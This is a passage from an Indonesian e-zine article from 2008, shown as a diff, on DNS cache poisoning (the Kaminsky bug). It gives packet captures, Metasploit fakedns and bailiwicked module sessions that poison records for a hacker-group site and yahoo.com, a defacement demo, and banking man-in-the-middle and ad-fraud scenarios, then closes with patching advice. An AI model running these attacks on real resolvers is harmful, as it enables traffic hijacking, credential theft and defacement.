+        .... .... ...1 .... = Non-authenticated data OK: Non-authenticated data is acceptable
+    Questions: 1
+    Answer RRs: 0
+    Authority RRs: 0
+    Additional RRs: 1
+    Queries
+        VmlcscEEItDB9.depkominfo.go.id: type A, class IN
+            Name: VmlcscEEItDB9.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+    Additional records
+        <Root>: type OPT
+            Name: <Root>
+            Type: OPT (EDNS0 option)
+            UDP payload size: 4096
+            Higher bits in extended RCODE: 0x0
+            EDNS0 version: 0
+            Z: 0x8000
+                Bit 0 (DO bit): 1 (Accepts DNSSEC security RRs)
+                Bits 1-15: 0x0 (reserved)
+            Data length: 0
+
+Internet Protocol, Src: 222.124.199.71 (222.124.199.71), Dst: 192.168.2.102 (192.168.2.102)
+User Datagram Protocol, Src Port: domain (53), Dst Port: domain (53)
+Domain Name System (response)
+    Transaction ID: 0x7eed
+    Flags: 0x8500 (Standard query response, No error)
+        1... .... .... .... = Response: Message is a response
+        .000 0... .... .... = Opcode: Standard query (0)
+        .... .1.. .... .... = Authoritative: Server is an authority for domain
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...1 .... .... = Recursion desired: Do query recursively
+        .... .... 0... .... = Recursion available: Server can't do recursive queries
+        .... .... .0.. .... = Z: reserved (0)
+        .... .... ..0. .... = Answer authenticated: Answer/authority portion was not authenticated by the server
+        .... .... .... 0000 = Reply code: No error (0)
+    Questions: 1
+    Answer RRs: 1
+    Authority RRs: 1
+    Additional RRs: 1
+    Queries
+        VmlcscEEItDB9.depkominfo.go.id: type A, class IN
+            Name: VmlcscEEItDB9.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+    Answers
+        VmlcscEEItDB9.depkominfo.go.id: type A, class IN, addr 135.177.94.73
+            Name: VmlcscEEItDB9.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+            Time to live: 12 hours, 28 minutes, 30 seconds
+            Data length: 4
+            Addr: 135.177.94.73
+    Authoritative nameservers
+        depkominfo.go.id: type NS, class IN, ns 192.168.2.105
+            Name: depkominfo.go.id
+            Type: NS (Authoritative name server)
+            Class: IN (0x0001)
+            Time to live: 12 hours, 28 minutes, 30 seconds
+            Data length: 15
+            Name server: 192.168.2.105
+    Additional records
+        192.168.2.105: type A, class IN, addr 135.177.94.73
+            Name: 192.168.2.105
+            Type: A (Host address)
+            Class: IN (0x0001)
+            Time to live: 12 hours, 28 minutes, 30 seconds
+            Data length: 4
+            Addr: 135.177.94.73
+
+
+Dari struktur diatas, kita dapat melihat attacker (192.168.2.105) mengirim
+query untuk VmlcscEEItDB9.depkominfo.go.id, kemudian resolver/dns server yang
+dijadikan target (192.168.2.102) akan melakukan recursive dns query untuk
+mencari authoritative dns server domain depkominfo.go.id serta menanyakan
+jawaban untuk server VmlcscEEItDB9.depkominfo.go.id, saat resolver tersebut
+mencari jawaban dari authoritative dns server attacker mengirimkan flooding
+response untuk pertanyaan tersebut. Dan jika QID response-nya sama dengan QID
+query resolver maka cache resolver akan teracuni, dan dengan metasploit hal ini
+paling tidak membutuhkan sekitar 3 menit. Konidisi race inilah yang menentukan
+apakah proses poisoning berhasil, jika response dari authoritative dns server
+domain depkominfo.go.id lebih dulu datang maka response berisi NXDOMAIN
+(non-existant domain) akan diberikan kepada resolver, dan resolver akan
+meneruskan kepada attacker. Seluruh flood yang tersisa untuk query tersebut
+akan di-discard oleh resolver.
+
+Jika attacker kalah cepat, maka attacker akan mencoba dengan domain yang lain,
+misalnya: 0Kk3zOr9fo0g3vpmbv.depkominfo.go.id, dan proses akan diulang kembali
+hingga attacker memenangkan race tersebut. Got the point now?!
+
+Ini contoh kondisi paket ketika response dari authoritative dns server domain
+depkominfo.go.id dengan QID yang asli datang lebih dulu pada resolver:
+
+
+Internet Protocol, Src: 222.124.199.71 (222.124.199.71), Dst: 192.168.2.102 (192.168.2.102)
+User Datagram Protocol, Src Port: domain (53), Dst Port: domain (53)
+Domain Name System (response)
+    [Request In: 275367]
+    [Time: 1.162314000 seconds]
+    Transaction ID: 0x2e16
+    Flags: 0x8483 (Standard query response, No such name)
+        1... .... .... .... = Response: Message is a response
+        .000 0... .... .... = Opcode: Standard query (0)
+        .... .1.. .... .... = Authoritative: Server is an authority for domain
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...0 .... .... = Recursion desired: Don't do query recursively
+        .... .... 1... .... = Recursion available: Server can do recursive queries
+        .... .... .0.. .... = Z: reserved (0)
+        .... .... ..0. .... = Answer authenticated: Answer/authority portion was not authenticated by the server
+        .... .... .... 0011 = Reply code: No such name (3)
+    Questions: 1
+    Answer RRs: 0
+    Authority RRs: 1
+    Additional RRs: 1
+    Queries
+        VmlcscEEItDB9.depkominfo.go.id: type A, class IN
+            Name: VmlcscEEItDB9.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+    Authoritative nameservers
+        depkominfo.go.id: type SOA, class IN, mname ns.depkominfo.go.id
+            Name: depkominfo.go.id
+            Type: SOA (Start of zone of authority)
+            Class: IN (0x0001)
+            Time to live: 1 hour
+            Data length: 33
+            Primary name server: ns.depkominfo.go.id
+            Responsible authority's mailbox: admin.depkominfo.go.id
+            Serial number: 2008052900
+            Refresh interval: 1 hour
+            Retry interval: 15 minutes
+            Expiration limit: 1 hour
+            Minimum TTL: 1 hour
+    Additional records
+        <Root>: type OPT
+            Name: <Root>
+            Type: OPT (EDNS0 option)
+            UDP payload size: 4096
+            Higher bits in extended RCODE: 0x0
+            EDNS0 version: 0
+            Z: 0x8000
+                Bit 0 (DO bit): 1 (Accepts DNSSEC security RRs)
+                Bits 1-15: 0x0 (reserved)
+            Data length: 0
+
+Internet Protocol, Src: 192.168.2.102 (192.168.2.102), Dst: 192.168.2.105 (192.168.2.105)
+User Datagram Protocol, Src Port: domain (53), Dst Port: 47498 (47498)
+Domain Name System (response)
+    [Request In: 275366]
+    [Time: 1.165049000 seconds]
+    Transaction ID: 0xffd4
+    Flags: 0x8183 (Standard query response, No such name)
+        1... .... .... .... = Response: Message is a response
+        .000 0... .... .... = Opcode: Standard query (0)
+        .... .0.. .... .... = Authoritative: Server is not an authority for domain
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...1 .... .... = Recursion desired: Do query recursively
+        .... .... 1... .... = Recursion available: Server can do recursive queries
+        .... .... .0.. .... = Z: reserved (0)
+        .... .... ..0. .... = Answer authenticated: Answer/authority portion was not authenticated by the server
+        .... .... .... 0011 = Reply code: No such name (3)
+    Questions: 1
+    Answer RRs: 0
+    Authority RRs: 1
+    Additional RRs: 0
+    Queries
+        VmlcscEEItDB9.depkominfo.go.id: type A, class IN
+            Name: VmlcscEEItDB9.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+    Authoritative nameservers
+        depkominfo.go.id: type SOA, class IN, mname ns.depkominfo.go.id
+            Name: depkominfo.go.id
+            Type: SOA (Start of zone of authority)
+            Class: IN (0x0001)
+            Time to live: 1 hour
+            Data length: 33
+            Primary name server: ns.depkominfo.go.id
+            Responsible authority's mailbox: admin.depkominfo.go.id
+            Serial number: 2008052900
+            Refresh interval: 1 hour
+            Retry interval: 15 minutes
+            Expiration limit: 1 hour
+            Minimum TTL: 1 hour
+
+
+
+Resolver akan meneruskan jawaban itu kepada attacker dan men-discard sisa
+response yang lain sehingg attacker harus mengulangi query-nya kepada resolver
+dengan domain yang berbeda.
+
+Kta juga dapat memanfaatkan servis dns server palsu dari metasploit yang dapat
+menerima query dns jika cache poisoning berhasil. Dengan fake service ini maka
+kita dapat mengontrol jawaban atasu suatu domian:
+
+msf auxiliary(fakedns) > show options
+
+Module options:
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on.
+   SRVPORT     53               yes       The local port to listen on.
+   TARGETHOST                   no        The address that all names should resolve to
+
+msf auxiliary(fakedns) > set SRVHOST 192.168.2.105
+SRVHOST => 192.168.2.105
+msf auxiliary(fakedns) > set TARGETHOST 192.168.2.105
+TARGETHOST => 192.168.2.105
+msf auxiliary(fakedns) > run
+[*] Auxiliary module running as background job
+msf auxiliary(fakedns) >
+[*] DNS 192.168.2.105:32771 XID 49330 (IN::A jj.com)
+[*] DNS 192.168.2.105:32771 XID 61002 (IN::PTR 105.2.168.192.in-addr.arpa)
+[*] DNS 192.168.2.105:32771 XID 8672 (IN::PTR 105.2.168.192.in-addr.arpa)
+[*] DNS 192.168.2.105:32771 XID 35441 (IN::PTR 105.2.168.192.in-addr.arpa)
+[*] DNS 192.168.2.105:32771 XID 23662 (IN::A www.google.com)
+[*] DNS 192.168.2.105:32771 XID 51012 (IN::A www.depkominfo.go.id)
+
+
+=======	 Wild Attack ---|
+
+Beberapa orang banyak yang meremehkan jenis bugs ini, namun jika kita melihat
+lebih dalam dan lebih teliti lagi maka bugs ini merupakan salah satu bugs yang
+mengerikan. HDM sendiri beserta perusahaan miliknya termasuk pihak yang di
+pwned oleh jenis exploit ini. Hal ini membuktikan bahwa walaupun kita sudah
+melakukan patch terhadap resolver/dns server milik kita namun resolver tersebut
+masih menunjuk resolver lain (mis: ISP) untuk proses resolving, dan resolver
+pada ISP tersebut belum dipatch maka query yang kita lakukan masih bisa di
+poison, hal ini merupakan efek dari sifat dns itu sendiri, yaitu recursive.
+
+Pertanyaan yang menarik adalah apa akibatnya jika proses poisoning berhasil
+dilakukan?!berikut ini beberapa kemungkinannya:
+
+
+1) Man-in-the Middle
+
+Beberapa internet banking belum menggunakan sistem token, hanya mengandalkan
+user/password dan koneksi SSL. Ambil contoh si fulan melakukan cache poisoning
+pada salah satu DNS server warnet di jakarta, kita bisa bilang warnet tersebut
+terletak di kawasan bisnis. Fulan melakukan poisoning untuk beberapa bank dan
+mengarahkannya ke server khusus, sehingga apabila ada request pada server
+tersebut maka akan diarahkan ke server fulan. Dan server fulan telah disetup
+untuk menjadi bridge antara request user dengan server internet banking yang
+sebenarnya, sehingga walaupun menggunakan koneksi SSL fulan masih tetap dapat
+membaca informasi private user warnet tersebut. Orang-orang teknikal mengatakan
+ini adalah teknik man-in-the-middle attack ;).
+
+2) Scammer
+
+Sama ketika ISP AT&T yang digunakan oleh perusahaan HDM di poisoning untuk
+domain google.com, scammer dapat membuat server khusus yang dapat menjadi
+jembatan ke google disertai dengan hidden adsense, sehingga setiap orang yang
+membuka google.com akan melewati server miliknya dan menaikan jumlah pendapatan
+adsense miliknya.
+
+
+3) Defacing
+
+Check this out,
+
+msf auxiliary(bailiwicked_host) > show options
+Module options:
+
+   Name      Current Setting            Required  Description
+   ----      ---------------            --------  -----------
+   HOSTNAME  www.kecoak-elektronik.net  yes       Hostname to hijack
+   NEWADDR   172.25.107.120             yes       New address for hostname
+   RECONS    208.67.222.222             yes       The nameserver used for reconnaissance
+   RHOST     172.25.107.120             yes       The target address
+   SRCADDR   Real                       yes       The source address to use for sending the queries (accepted: Real, Random)
+   SRCPORT   53                         yes       The target server's source query port (0 for automatic)
+   TTL       47571                      yes       The TTL for the malicious host entry
+   XIDS      0                          yes       The number of XIDs to try for each query (0 for automatic)
+
+msf auxiliary(bailiwicked_host) > exploit
+[*] Targeting nameserver 172.25.107.120 for injection of www.kecoak-elektronik.net. as 172.25.107.120
+[*] Querying recon nameserver for kecoak-elektronik.net.'s nameservers...
+[*]  Got an NS record: kecoak-elektronik.net.  172800  IN      NS      ns1.ipowerdns.com.
+[*]   Querying recon nameserver for address of ns1.ipowerdns.com....
+[*]    Got an A record: ns1.ipowerdns.com.      172783  IN      A       66.96.142.102
+[*]     Checking Authoritativeness: Querying 66.96.142.102 for kecoak-elektronik.net....
+[*]     ns1.ipowerdns.com. is authoritative for kecoak-elektronik.net., adding to list of nameservers to spoof as
+[*]  Got an NS record: kecoak-elektronik.net.  172800  IN      NS      ns1.ipowerweb.net.
+[*]   Querying recon nameserver for address of ns1.ipowerweb.net....
+[*]    Got an A record: ns1.ipowerweb.net.      172795  IN      A       66.96.142.103
+[*]     Checking Authoritativeness: Querying 66.96.142.103 for kecoak-elektronik.net....
+[*]     ns1.ipowerweb.net. is authoritative for kecoak-elektronik.net., adding to list of nameservers to spoof as
+[*] Calculating the number of spoofed replies to send per query...
+[*]   race calc: 100 queries | min/max/avg time: 0.8/3.63/1.07 | min/max/avg replies: 610/2661/896
+[*] Sending 672 spoofed replies from each nameserver (2) for each query
+[*] Attempting to inject a poison record for www.kecoak-elektronik.net. into 172.25.107.120:53...
+[*] Poisoning successful after 250 queries and 336000 responses: www.kecoak-elektronik.net == 172.25.107.120
+[*] TTL: 47178 DATA: #<Resolv::DNS::Resource::IN::A:0xb5f7e7d8>
+[*] Auxiliary module execution completed
+
+$ telnet www.kecoak-elektronik.net 80
+Trying 172.25.107.120...
+Connected to www.kecoak-elektronik.net.
+Escape character is '^]'.
+GET / HTTP/1.1
+Host:www.kecoak-elektronik.net
+
+HTTP/1.1 200 OK
+Date: Sun, 03 Aug 2008 06:09:40 GMT
+Server: Apache/2.2.8 (Unix) DAV/2
+Last-Modified: Sun, 03 Aug 2008 06:08:59 GMT
+ETag: "2ba56-3a-453880efd94c0"
+Accept-Ranges: bytes
+Content-Length: 58
+Content-Type: text/html
+
+<html><body><h1>Blah blah blah, K-Elektronik has bee HackeD !!! </h1></body></html>
+
+
+Yeah, defacing is not so kewl, isn't it?! ;)
+
+
+4) Dan lain sebagainya
+
+Banyak yang bisa dilakukan. Tergantung imaginasi masing-masing. Yang pasti,
+selama dns cache poisoning dapat dilakukan semua user pengguna DNS tersebut
+tidak aman. Facebook, myspace, yahoo, google, government, email dapat dijadikan
+bahan mainan dengan mudah. Jika ada yang mengatakan bahwa server-server seperti
+yahoo ataupun google tidak akan terkena efek dns cache poisoning, maka berarti
+belum memahami konsep dari cache poisoning ini ;).
+
+
+msf auxiliary(bailiwicked_domain) > set DOMAIN yahoo.com DOMAIN => yahoo.com
+msf auxiliary(bailiwicked_domain) > exploit
+[*] Targeting nameserver 172.25.107.120 for injection of yahoo.com. nameservers as 208.67.220.220
+[*] Querying recon nameserver for yahoo.com.'s nameservers...
+[*]  Got an NS record: yahoo.com.              172793  IN      NS      ns2.yahoo.com.
+[*]   Querying recon nameserver for address of ns2.yahoo.com....
+[*]    Got an A record: ns2.yahoo.com.          172799  IN      A       68.142.255.16
+[*]     Checking Authoritativeness: Querying 68.142.255.16 for yahoo.com....
+[*]     ns2.yahoo.com. is authoritative for yahoo.com., adding to list of nameservers to spoof as
+[*]  Got an NS record: yahoo.com.              172793  IN      NS      ns1.yahoo.com.
+[*]   Querying recon nameserver for address of ns1.yahoo.com....
+[*]    Got an A record: ns1.yahoo.com.          172799  IN      A       66.218.71.63
+[*]     Checking Authoritativeness: Querying 66.218.71.63 for yahoo.com....
+[*]     ns1.yahoo.com. is authoritative for yahoo.com., adding to list of nameservers to spoof as
+[*]  Got an NS record: yahoo.com.              172793  IN      NS      ns3.yahoo.com.
+[*]   Querying recon nameserver for address of ns3.yahoo.com....
+[*]    Got an A record: ns3.yahoo.com.          172800  IN      A       217.12.4.104
+[*]     Checking Authoritativeness: Querying 217.12.4.104 for yahoo.com....
+[*]     ns3.yahoo.com. is authoritative for yahoo.com., adding to list of nameservers to spoof as
+[*]  Got an NS record: yahoo.com.              172793  IN      NS      ns4.yahoo.com.
+[*]   Querying recon nameserver for address of ns4.yahoo.com....
+[*]    Got an A record: ns4.yahoo.com.          172795  IN      A       68.142.196.63
+[*]     Checking Authoritativeness: Querying 68.142.196.63 for yahoo.com....
+[*]     ns4.yahoo.com. is authoritative for yahoo.com., adding to list of nameservers to spoof as
+[*]  Got an NS record: yahoo.com.              172793  IN      NS      ns5.yahoo.com.
+[*]   Querying recon nameserver for address of ns5.yahoo.com....
+[*]    Got an A record: ns5.yahoo.com.          1798    IN      A       119.160.247.124
+[*]     Checking Authoritativeness: Querying 119.160.247.124 for yahoo.com....
+[*]     ns5.yahoo.com. is authoritative for yahoo.com., adding to list of nameservers to spoof as
+[*]  Got an NS record: yahoo.com.              172793  IN      NS      ns6.yahoo.com.
+[*]   Querying recon nameserver for address of ns6.yahoo.com....
+[*]    Got an A record: ns6.yahoo.com.          172793  IN      A       202.43.223.170
+[*]     Checking Authoritativeness: Querying 202.43.223.170 for yahoo.com....
+[*]     ns6.yahoo.com. is authoritative for yahoo.com., adding to list of nameservers to spoof as
+[*]  Got an NS record: yahoo.com.              172793  IN      NS      ns8.yahoo.com.
+[*]   Querying recon nameserver for address of ns8.yahoo.com....
+[*]    Got an A record: ns8.yahoo.com.          172788  IN      A       202.165.104.22
+[*]     Checking Authoritativeness: Querying 202.165.104.22 for yahoo.com....
+[*]     ns8.yahoo.com. is authoritative for yahoo.com., adding to list of nameservers to spoof as
+[*] Attempting to inject poison records for yahoo.com.'s nameservers into 172.25.107.120:53...
+[*] Poisoning successful after 750 queries and 84000 responses: yahoo.com. == 208.67.220.220
+[*] Auxiliary module execution completed
+
+
+
+bt htdocs # dig -t NS yahoo.com
+
+; <<>> DiG 9.4.1 <<>> -t NS yahoo.com
+;; global options:  printcmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57076
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;yahoo.com.                     IN      NS
+
+;; ANSWER SECTION:
+yahoo.com.              28765   IN      NS      208.67.220.220.
+
+;; Query time: 2 msec
+;; SERVER: 172.25.107.120#53(172.25.107.120)
+;; WHEN: Sun Aug  3 09:15:38 2008
+;; MSG SIZE  rcvd: 55
+
+
+
+
+=======	Solution ---|
+
+
+Patch! administrator warnet patch, admin ISP patch, admin sekolah patch, admin
+perusahaan patch. User biasa?!satu cara paling aman adalah menggunakan setting
+DNS server yang terbukti aman, salah satunya Open DNS. Jika main ke warnet,
+pastikan setting konfigurasi dns server menggunakan ip opendns yaitu:
+208.67.222.222 dan 208.67.220.220.
+
+Beberapa pihak mengembangkan metode untuk mencegah serangan ini. Namun bisa
+kita yakini dari 11 juta dns server, tidak semua administratornya mengetahui
+hal ini. Jadi paling aman adalah mengamankan diri kita sendiri dengan
+memanfaatkan dns server yang yakin telah dipatch.
+
+
+=======	 Summary ---|
+
+Saat menulis artikel ini, Cybertank sempat mengingatkan apakah yakin hendak
+menjelaskan masalah ini kepada masyarakat Indonesia melalui artikel lengkap,
+karena jika banyak yang memahami bugs ini sedangkan kondisi internet di
+Indonesia bisa dibilang sangat rentan (warnet membludak dengan tingkat security
+rendah, sekolahan banyak, dsb) dan patch belum sepenuhnya diimplementasikan,
+hal ini akan membuat lebih banyak pihak paham dan masing-masing dapat
+mengembangkan variasi serangan nya. 
+
+Well, at least, IMHO, diharapkan dengan adanya artikel ini semakin banyak
+administrator yang memahami betapa pentingnya bugs tersebut. Diharapkan juga
+para newbie dapat lebih memahami proses kerja Domain Name System. Dan
+diharapkan artikel sederhana ini mungkin bisa menjadi tambahan pengetahuan
+variasi serangan cache poisoning para researcher dan aktivis security
+Indonesia, sehingga kita tidak ketinggalan informasi dan pengetahuan dari
+masyarakat manca negara.
+
+Semoga bermanfaat. 
+
+Wassalam!
+
+
+
+=======	 Referensi ---|
+
+- http://addxorrol.blogspot.com/2008/07/on-dans-request-for-no-speculation.html
+- http://www.secure64.com/ddos-news/index.html
+- http://gregness.wordpress.com/2008/07/23/dns-vulnerability-an-exclusive-interview-with-cricket-liu/
+- http://www.secureworks.com/research/articles/dns-cache-poisoning/
+- http://www.networkworld.com/news/2008/073008-dns-attack-writer-a-victim.html
+- http://www.linuxjournal.com/content/understanding-kaminskys-dns-bug
+- http://www.kecoak-elektronik.net/log/2008/07/23/dns-vuln-leaked/
+
+
+
+=======	Greetz --|
+
+~ All K-Elektronik staff, All ECHO staff
+~ All Indonesian Underground Community
+~ All Indonesian whitehat & security profesional
+
+                     *- $e19dot008dottxt - echo|zine - issue#19 - 080808 -*
